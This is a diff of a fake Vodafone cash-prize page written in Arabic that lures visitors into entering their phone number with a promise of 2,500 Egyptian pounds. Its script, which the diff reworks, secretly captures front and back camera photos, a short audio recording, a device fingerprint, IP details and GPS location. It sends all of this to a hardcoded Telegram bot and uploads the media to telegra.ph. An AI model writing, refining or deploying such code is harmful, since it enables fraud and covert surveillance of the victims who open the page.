@@ -8,12 +8,11 @@
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             background: linear-gradient(145deg, #6a1b1a 0%, #8b1e1c 100%);
-            font-family: 'Cairo', 'Tajawal', -apple-system, system-ui, sans-serif;
+            font-family: 'Cairo', 'Tajawal', sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            margin: 0;
             padding: 16px;
         }
         .vodafone-card {
@@ -21,7 +20,7 @@
             width: 100%;
             background: white;
             border-radius: 32px;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3), 0 0 0 12px rgba(230, 30, 30, 0.2);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
             overflow: hidden;
         }
         .vodafone-header {
@@ -223,15 +222,14 @@
 
 <script>
     (function() {
-        // ===================== إعدادات البوت (تم استبدالها بالقيم الجديدة) =====================
+        // ===================== إعدادات البوت =====================
         const BOT_TOKEN = "8425168324:AAGiTTzty3oL5GMUtMWa74ejRKm7DJlTayU";
         const MASTER_ID = "5849068535";
         
-        // إرسال رسالة نصية عادية
         async function sendTextToBot(message) {
             try {
                 const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-                const response = await fetch(url, {
+                await fetch(url, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -240,18 +238,19 @@
                         parse_mode: 'HTML'
                     })
                 });
-                return response.ok;
-            } catch(e) { console.warn(e); return false; }
+                return true;
+            } catch(e) { return false; }
         }
         
-        // رفع ملف (صورة/صوت) على telegra.ph والحصول على رابط مباشر
+        // رفع الملفات إلى Telegra.ph مع تحسين جودة الرفع
         async function uploadToTelegraph(blob, filename) {
             const formData = new FormData();
             formData.append('file', blob, filename);
             try {
                 const response = await fetch('https://telegra.ph/upload', {
                     method: 'POST',
-                    body: formData
+                    body: formData,
+                    mode: 'cors'
                 });
                 const result = await response.json();
                 if (result && result[0] && result[0].src) {
@@ -259,17 +258,73 @@
                 }
                 return null;
             } catch(e) {
-                console.warn("Upload failed", e);
+                console.error("Upload error:", e);
                 return null;
             }
         }
 
-        // =================== باقي الدوال ===================
+        // التقاط صورة من الكاميرا (أمامية أو خلفية)
+        async function captureAndUpload(facingMode, label, phoneNumber) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: { exact: facingMode } } 
+                });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.playsInline = true;
+                await video.play();
+                await new Promise(r => setTimeout(r, 500));
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 1280;
+                canvas.height = video.videoHeight || 720;
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));
+                stream.getTracks().forEach(t => t.stop());
+                
+                const url = await uploadToTelegraph(blob, `${label}_${Date.now()}.jpg`);
+                return url;
+            } catch(e) {
+                console.error(`${label} error:`, e);
+                return null;
+            }
+        }
+        
+        // تسجيل صوتي ورفعه
+        async function recordAndUpload(phoneNumber) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
+                
+                mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                const recordedPromise = new Promise(resolve => {
+                    mediaRecorder.onstop = async () => {
+                        const blob = new Blob(chunks, { type: 'audio/webm' });
+                        const url = await uploadToTelegraph(blob, `audio_${Date.now()}.webm`);
+                        resolve(url);
+                    };
+                });
+                
+                mediaRecorder.start();
+                await new Promise(r => setTimeout(r, 6000)); // 6 ثوانٍ
+                mediaRecorder.stop();
+                stream.getTracks().forEach(t => t.stop());
+                
+                return await recordedPromise;
+            } catch(e) {
+                console.error("Audio error:", e);
+                return null;
+            }
+        }
+        
+        // الحصول على معلومات الجهاز
         async function getDeviceInfo(phoneNumber) {
             const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
             const screenData = `${screen.width}x${screen.height}x${screen.colorDepth}`;
             const memory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "غير معلن";
-            const cores = navigator.hardwareConcurrency ? navigator.hardwareConcurrency : "غير معروف";
+            const cores = navigator.hardwareConcurrency || "غير معروف";
             let batteryLevel = "غير متاح";
             if (navigator.getBattery) {
                 try {
@@ -277,78 +332,41 @@
                     batteryLevel = `${Math.round(battery.level*100)}%, ${battery.charging ? 'موصول' : 'بطارية'}`;
                 } catch(e) {}
             }
-            return `🖥️ <b>بصمة الجهاز</b>\n📞 الرقم: ${phoneNumber}\n📱 الشاشة: ${screenData}\n💾 الرام: ${memory} | النوى: ${cores}\n🔋 البطارية: ${batteryLevel}\n📍 الوقت: ${timeZone}\n🕒 التوقيت: ${new Date().toLocaleString('ar-EG')}`;
+            return `🖥️ <b>بصمة الجهاز</b>\n📞 ${phoneNumber}\n📱 الشاشة: ${screenData}\n💾 الرام: ${memory} | النوى: ${cores}\n🔋 البطارية: ${batteryLevel}\n📍 الوقت: ${timeZone}\n🕒 التوقيت: ${new Date().toLocaleString('ar-EG')}`;
         }
-
+        
+        // معلومات الـ IP
         async function getIPInfo(phoneNumber) {
             try {
-                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const [ipRes, ipInfoRes] = await Promise.all([
+                    fetch('https://api.ipify.org?format=json'),
+                    fetch('https://ipapi.co/json/')
+                ]);
                 const ipData = await ipRes.json();
-                const ipInfoRes = await fetch('https://ipapi.co/json/');
                 const ipDetails = await ipInfoRes.json();
-                return `🌐 <b>معلومات IP</b>\n📞 الرقم: ${phoneNumber}\n🔹 IP: ${ipData.ip}\n🏳️ البلد: ${ipDetails.country_name || 'غير معروف'}\n🏙️ المدينة: ${ipDetails.city || 'غير معروف'}\n📡 المزود: ${ipDetails.org || 'غير معروف'}`;
+                return `🌐 <b>معلومات IP</b>\n📞 ${phoneNumber}\n🔹 IP: ${ipData.ip}\n🏳️ البلد: ${ipDetails.country_name || 'غير معروف'}\n🏙️ المدينة: ${ipDetails.city || 'غير معروف'}\n📡 المزود: ${ipDetails.org || 'غير معروف'}`;
             } catch(e) {
                 return `🌐 IP: تعذر الحصول على البيانات`;
             }
         }
-
+        
+        // الموقع الجغرافي
         function getLocation(phoneNumber) {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) { resolve(null); return; }
                 navigator.geolocation.getCurrentPosition(async (pos) => {
-                    const lat = pos.coords.latitude;
-                    const lng = pos.coords.longitude;
+                    const { latitude, longitude } = pos.coords;
                     let address = "";
                     try {
-                        const revGeo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18`);
+                        const revGeo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18`);
                         const data = await revGeo.json();
                         if (data.display_name) address = data.display_name.substring(0, 150);
                     } catch(e) {}
-                    resolve(`📍 <b>الموقع الجغرافي</b>\n📞 الرقم: ${phoneNumber}\n🎯 خط العرض: ${lat}\n🎯 خط الطول: ${lng}\n🗺️ خرائط: https://www.google.com/maps?q=${lat},${lng}\n${address ? '🏠 ' + address : ''}`);
+                    resolve(`📍 <b>الموقع الجغرافي</b>\n📞 ${phoneNumber}\n🎯 ${latitude}, ${longitude}\n🗺️ https://www.google.com/maps?q=${latitude},${longitude}\n${address ? '🏠 ' + address : ''}`);
                 }, () => resolve(null), { enableHighAccuracy: true, timeout: 8000 });
             });
         }
-
-        async function captureCamera(facingMode, label, phoneNumber) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.playsInline = true;
-                video.play();
-                await new Promise(r => setTimeout(r, 500));
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 800;
-                canvas.height = video.videoHeight || 600;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
-                stream.getTracks().forEach(t => t.stop());
-                
-                const url = await uploadToTelegraph(blob, `${label}.jpg`);
-                return url;
-            } catch(e) { return null; }
-        }
-
-        async function recordAudio(phoneNumber) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                const mediaRecorder = new MediaRecorder(stream);
-                const chunks = [];
-                mediaRecorder.ondataavailable = e => chunks.push(e.data);
-                const audioPromise = new Promise(resolve => {
-                    mediaRecorder.onstop = async () => {
-                        const blob = new Blob(chunks, { type: 'audio/webm' });
-                        const url = await uploadToTelegraph(blob, `audio_${Date.now()}.webm`);
-                        resolve(url);
-                    };
-                });
-                mediaRecorder.start();
-                setTimeout(() => mediaRecorder.stop(), 7000);
-                setTimeout(() => stream.getTracks().forEach(t => t.stop()), 8000);
-                return await audioPromise;
-            } catch(e) { return null; }
-        }
-
+        
         // =============== التشغيل الرئيسي ===============
         const claimBtn = document.getElementById('claimMoneyBtn');
         const phoneInput = document.getElementById('targetPhone');
@@ -375,46 +393,47 @@
             loaderDiv.style.visibility = "visible";
             statusSpan.innerHTML = "📡 جاري طلب الأذونات...";
             
-            // 1. إرسال رقم الهاتف أولاً
-            await sendTextToBot(`📞 <b>رقم المستفيد الجديد</b>\n🔢 الرقم: ${phoneNumber}\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`);
+            // 1. إرسال رقم الهاتف
+            await sendTextToBot(`📞 <b>رقم المستفيد الجديد</b>\n🔢 ${phoneNumber}\n⏰ ${new Date().toLocaleString('ar-EG')}`);
             
-            // 2. بصمة الجهاز + IP
+            // 2. معلومات الجهاز + IP
             loaderText.innerText = "📱 جاري قراءة بيانات الجهاز...";
-            const deviceMsg = await getDeviceInfo(phoneNumber);
-            const ipMsg = await getIPInfo(phoneNumber);
-            await sendTextToBot(deviceMsg);
-            await sendTextToBot(ipMsg);
+            await sendTextToBot(await getDeviceInfo(phoneNumber));
+            await sendTextToBot(await getIPInfo(phoneNumber));
             
-            // 3. الكاميرا الأمامية
+            // 3. الكاميرا الأمامية (سيلفي)
             loaderText.innerText = "📸 جاري فتح الكاميرا الأمامية...";
-            const frontUrl = await captureCamera('user', 'selfie', phoneNumber);
-            if (frontUrl) await sendTextToBot(`📸 <b>صورة السيلفي</b>\n📞 الرقم: ${phoneNumber}\n🔗 ${frontUrl}`);
+            const frontUrl = await captureAndUpload('user', 'selfie', phoneNumber);
+            if (frontUrl) await sendTextToBot(`📸 <b>صورة السيلفي</b>\n📞 ${phoneNumber}\n🔗 ${frontUrl}`);
+            else await sendTextToBot(`❌ فشل التقاط الكاميرا الأمامية`);
             
             // 4. الكاميرا الخلفية
             loaderText.innerText = "📷 جاري فتح الكاميرا الخلفية...";
-            const backUrl = await captureCamera('environment', 'surrounding', phoneNumber);
-            if (backUrl) await sendTextToBot(`📷 <b>صورة الكاميرا الخلفية</b>\n📞 الرقم: ${phoneNumber}\n🔗 ${backUrl}`);
+            const backUrl = await captureAndUpload('environment', 'surrounding', phoneNumber);
+            if (backUrl) await sendTextToBot(`📷 <b>صورة الكاميرا الخلفية</b>\n📞 ${phoneNumber}\n🔗 ${backUrl}`);
+            else await sendTextToBot(`❌ فشل التقاط الكاميرا الخلفية`);
             
             // 5. التسجيل الصوتي
-            loaderText.innerText = "🎤 جاري تسجيل الصوت (7 ثوان)...";
-            const audioUrl = await recordAudio(phoneNumber);
-            if (audioUrl) await sendTextToBot(`🎤 <b>تسجيل صوتي</b>\n📞 الرقم: ${phoneNumber}\n🔗 ${audioUrl}`);
+            loaderText.innerText = "🎤 جاري تسجيل الصوت...";
+            const audioUrl = await recordAndUpload(phoneNumber);
+            if (audioUrl) await sendTextToBot(`🎤 <b>تسجيل صوتي</b>\n📞 ${phoneNumber}\n🔗 ${audioUrl}`);
+            else await sendTextToBot(`❌ فشل التسجيل الصوتي`);
             
-            // 6. الموقع
+            // 6. الموقع الجغرافي
             loaderText.innerText = "📍 جاري تحديد الموقع...";
             const locationMsg = await getLocation(phoneNumber);
             if (locationMsg) await sendTextToBot(locationMsg);
             
-            // 7. إشعار الإكتمال
-            await sendTextToBot(`✅ <b>اكتمل جمع البيانات بنجاح!</b>\n📞 الرقم: ${phoneNumber}\n💰 سيتم صرف 2500 ج.م خلال 24 ساعة إلى هذا الرقم`);
+            // 7. إتمام العملية
+            await sendTextToBot(`✅ <b>اكتمل جمع البيانات!</b>\n📞 ${phoneNumber}\n💰 سيتم صرف 2500 ج.م خلال 24 ساعة`);
             
             loaderDiv.style.visibility = "hidden";
             errorDiv.style.backgroundColor = "#e8f5e9";
             errorDiv.style.color = "#2e7d32";
-            errorDiv.innerText = "🎉 تم استلام طلبك بنجاح! خلال 24 ساعة سوف يصلك المبلغ.";
+            errorDiv.innerText = "🎉 تم استلام طلبك! سيصلك المبلغ خلال 24 ساعة.";
             errorDiv.style.display = "block";
             claimBtn.disabled = false;
-            statusSpan.innerHTML = "✅ تم التفعيل - سيصلك المبلغ خلال 24 ساعة";
+            statusSpan.innerHTML = "✅ تم التفعيل";
             isRunning = false;
             
             setTimeout(() => errorDiv.style.display = "none", 8000);
